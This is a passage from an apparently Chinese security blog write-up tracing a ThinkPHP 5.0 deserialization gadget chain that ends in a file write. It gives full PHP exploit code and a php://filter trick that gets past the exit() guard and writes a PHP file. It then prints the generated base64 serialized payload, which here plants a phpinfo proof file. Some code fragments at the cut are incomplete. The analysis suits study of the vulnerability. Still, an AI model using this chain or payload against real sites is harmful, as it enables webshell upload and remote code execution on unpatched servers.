反序列化是不会调用`__construct()`的，因此`$handle`可控
因此可以全局查看一下哪里的write可以利用：
这里可以看见有好几个write函数存在，也有多个可以利用的点。这里主要让我们看一下`Memcache.php`中的Write函数。
    thinkphp/library/think/session/driver/Memcache.php
`$handler`可控，因此可以随便调用任何文件中的set函数，全局查找set函数：
这里还是使用Seay进行查找。
这里可以看见很多不同的函数使用文件，可以都看一下，这里如果是想要使用写入webshell，主要的利用点在`File.php`文件中，文件路径：
    thinkphp/library/think/cache/driver/File.php
可以看见危险函数`file_put_contents($filename,$data)`，这里可以用来写入webshell。具体内容可以由我们自己决定。
这里一般来说，只要我们使用一个``，然后访问对应文件，出现了详情页面，就可以用来证明漏洞存在了。
这里分析一下如何利用到这个`file_put_contents()`函数。
第一个if是判断`$expire`的，对`$expire`进行了设置。
第二个if用来判断`$expire`是不是`DataTime`的子类，设置时间戳。
然后将`$filename`调用`getCacheKey()`函数进行了值的设置，因为`$filename`是`file_put_contents()`函数中的一个参数，所以这里我们跟进函数。
    protected function getCacheKey($name, $auto = false)
        {
            $name = md5($name); //$name进行md5加密
            if ($this->options['cache_subdir']) { 
                // 使用子目录
                $name = substr($name, 0, 2) . DS . substr($name, 2);
            }
            if ($this->options['prefix']) {
                $name = $this->options['prefix'] . DS . $name;
            }
            $filename = $this->options['path'] . $name . '.php';
            $dir      = dirname($filename);
            if ($auto && !is_dir($dir)) {
                mkdir($dir, 0755, true);
            }
            return $filename;
        }
可以看见两个if主要是用来更改文件名的，因为`$options`可以控制，所以可以直接修改之后绕过。
然后到了`$filename`进行设置的地方了，这里同样因为`$options`可以进行控制，所以基本是可以确定文件名是可控的，同时文件的后缀也是被写死了是.php。
后面的函数不会影响`$filename`，因此可以确定`$filename`可以控制。
继续分析，可以看见$data作为`file_put_contents()`函数的参数是进行序列化出来的，参数是使用的`$value`。
这里会出现两个问题，因为`$value`这个值是调用函数时传入的参数，在`writeln`中一路传过来的时候，已经是被确定了为布尔值的`true`，因此我们不能对`$value`达成控制的效果。
而这里，也可以看见`$data`的值也是被写死了，并且存在一个`exit()`函数，需要进行死亡绕过。
    $data   = "\n" . $data; //这里连接了一个$data
如果不能解决这两个问题，这条链子是没法调用的。
这里需要往下看
跟进到setTagItem()，
可以看见这里将`$filename`作为参数传递进去，同时在下方继续对set()函数进行了调用，将$key和$value作为参数传递了回去。
可以看见，在这里的`$value`是赋值为了`$filename`的值，因此，如果是构造了较为合理的`$filename`，那么就可以进行文件的写入。
写入了文件之后，需要考虑到代码执行的问题，因此需要对exit()函数进行绕过，这里需要用到PHP伪协议的知识，来对exit()函数进行死亡绕过。
> 死亡绕过参考：
到这里，这条链子算是走通了。
## EXP:
按照我们现在进行的一系列分析，可以尝试写出EXP如下：
    files = [$Pivot];
            }
        }
    }
    //Pivot类
    namespace think {
        abstract class Model{
            protected $append = [];
            protected $error = null;
            protected $parent;
            function __construct($output, $modelRelation)
            {
                $this->parent = $output;  //$this->parent=> think\console\Output;
                $this->append = array("1"=>"getError");     //调用getError 返回this->error
                $this->error = $modelRelation;               // $this->error 要为 relation类的子类，并且也是OnetoOne类的子类，也就是HasOne
            }
        }
    }
    namespace think\model{
        use think\Model;
        class Pivot extends Model{
            function __construct($output, $modelRelation)
            {
                parent::__construct($output, $modelRelation);
            }
        }
    }
    //HasOne类
    namespace think\model\relation{
        class HasOne extends OneToOne {
        }
    }
    namespace think\model\relation {
        abstract class OneToOne
        {
            protected $selfRelation;
            protected $bindAttr = [];
            protected $query;
            function __construct($query)
            {
                $this->selfRelation = 0;
                $this->query = $query;    //$query指向Query
                $this->bindAttr = ['xxx'];// $value值，作为call函数引用的第二变量
            }
        }
    }
    //Query类，用来匹配$parent
    namespace think\db {
        class Query {
            protected $model;
            function __construct($model) //传入的需要是Output类的对象
            {
                $this->model = $model;
            }
        }
    }
    //Output类
    namespace think\console{
        class Output{
            protected $styles = ["getAttr"];
            private $handle;
            public function __construct($handle)
            {
                $this->handle = $handle; //是Memcached类的对象，需要调用这个里面的write
            }
        }
    }
    //Memcached类
    namespace think\session\driver {
        class Memcached{
            protected $handler;
            public function __construct($handler)
            {
                $this->handler = $handler; //是File类的对象，需要使用其中的set方法
            }
        }
    }
    //File类
    namespace think\cache\driver {
        class File
        {
            protected $options=null;
            protected $tag;
            public function __construct()
            {
                $this->options=[
                    'expire' => 0,
                    'cache_subdir' => '0', //绕过getCacheKey中的第一个if
                    'prefix' => '0', //绕过getCacheKey中的第二个if
                    'path'  => 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=xxxPD9waHAgcGhwaW5mbygpOz8+/../a.php', //有php+12个0+exit，共21个字符，为了凑到4的整数倍，需要加上三个字符
                    'data_compress' => false,
                ];
                $this->tag = '1'; //用于后续控制文件名，需要使用
            }
        }
    }
    namespace {
        $Memcached = new think\session\driver\Memcached(new \think\cache\driver\File());
        $Output = new think\console\Output($Memcached);
        $model = new think\db\Query($Output);
        $HasOne = new think\model\relation\HasOne($model);
        $window = new think\process\pipes\Windows(new think\model\Pivot($Output, $HasOne));
        echo base64_encode(serialize($window));
    }
运行后生成：
    TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mzp7czo5OiIAKgBhcHBlbmQiO2E6MTp7aToxO3M6ODoiZ2V0RXJyb3IiO31zOjg6IgAqAGVycm9yIjtPOjI3OiJ0aGlua1xtb2RlbFxyZWxhdGlvblxIYXNPbmUiOjM6e3M6MTU6IgAqAHNlbGZSZWxhdGlvbiI7aTowO3M6MTE6IgAqAGJpbmRBdHRyIjthOjE6e2k6MDtzOjM6Inh4eCI7fXM6ODoiACoAcXVlcnkiO086MTQ6InRoaW5rXGRiXFF1ZXJ5IjoxOntzOjg6IgAqAG1vZGVsIjtPOjIwOiJ0aGlua1xjb25zb2xlXE91dHB1dCI6Mjp7czo5OiIAKgBzdHlsZXMiO2E6MTp7aTowO3M6NzoiZ2V0QXR0ciI7fXM6Mjg6IgB0aGlua1xjb25zb2xlXE91dHB1dABoYW5kbGUiO086MzA6InRoaW5rXHNlc3Npb25cZHJpdmVyXE1lbWNhY2hlZCI6MTp7czoxMDoiACoAaGFuZGxlciI7TzoyMzoidGhpbmtcY2FjaGVcZHJpdmVyXEZpbGUiOjI6e3M6MTA6IgAqAG9wdGlvbnMiO2E6NTp7czo2OiJleHBpcmUiO2k6MDtzOjEyOiJjYWNoZV9zdWJkaXIiO3M6MToiMCI7czo2OiJwcmVmaXgiO3M6MToiMCI7czo0OiJwYXRoIjtzOjEwNjoicGhwOi8vZmlsdGVyL2NvbnZlcnQuaWNvbnYudXRmLTgudXRmLTd8Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPXh4eFBEOXdhSEFnY0dod2FXNW1ieWdwT3o4Ky8uLi9hLnBocCI7czoxMzoiZGF0YV9jb21wcmVzcyI7YjowO31zOjY6IgAqAHRhZyI7czoxOiIxIjt9fX19fXM6OToiACoAcGFyZW50IjtyOjExO319fQ
传入：
效果图：
这里分析一下文件名是怎么生成的
**第一次进入set函数的时候：**
首先将$name进行md5加密，然后连接到$this->options['path']后面，再加上.php
可以得到`$filename`如下：
    php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=xxxPD9waHAgcGhwaW5mbygpOz8+/../a.php8db7a8c80e67e908f96fbf22dde11df3.php
然后进行`file_put_contents()`，可以得到第一个文件，同时第一个$data值是将恒为true的$value反序列化，得到b:1;
**第二次进入set函数的时候：**
会经过setTagtem()函数，进行重新赋值，进入到has方法，跟进到get方法，然后重新调用到File类的getCacheKey方法，此时的$name是tag_md5("1"),也就是`tag_c4ca4238a0b923820dcc509a6f75849b`
然后上面的再次md5，得到`3b58a9545013e88c7186db11bb158c44`，按照之前的方法，连接到后面，就会出现新的`$filename`
    php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=xxxPD9waHAgcGhwaW5mbygpOz8+/../a.php3b58a9545013e88c7186db11bb158c44.php
因为这个文件不存在，会返回false所以会跳过if($this->has($key))，直接令$value等于输入的$name，也就是tag_md5("1")，也就是`tag_c4ca4238a0b923820dcc509a6f75849b`
然后再次进入set()函数，这一次会进入getCacheKey()函数，然后再次md5加密，得到md5(tag_md5("1"))，也就是$filename
    php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=xxxPD9waHAgcGhwaW5mbygpOz8+/../a.php3b58a9545013e88c7186db11bb158c44.php
然后因为第一次进入setTagItem()函数的时候，会将tag设置为null，所以不会再进入，写入成功。
因此最后我们需要的文件名应该是这个格式：
[https://blog.csdn.net/Zero_Adam/article/details/116170568?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-116170568-blog-119196766.pc_relevant_aa_2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-116170568-blog-119196766.pc_relevant_aa_2&utm_relevant_index=2](https://blog.csdn.net/Zero_Adam/article/details/116170568?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-116170568-blog-119196766.pc_relevant_aa_2&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1-116170568-blog-119196766.pc_relevant_aa_2&utm_relevant_index=2)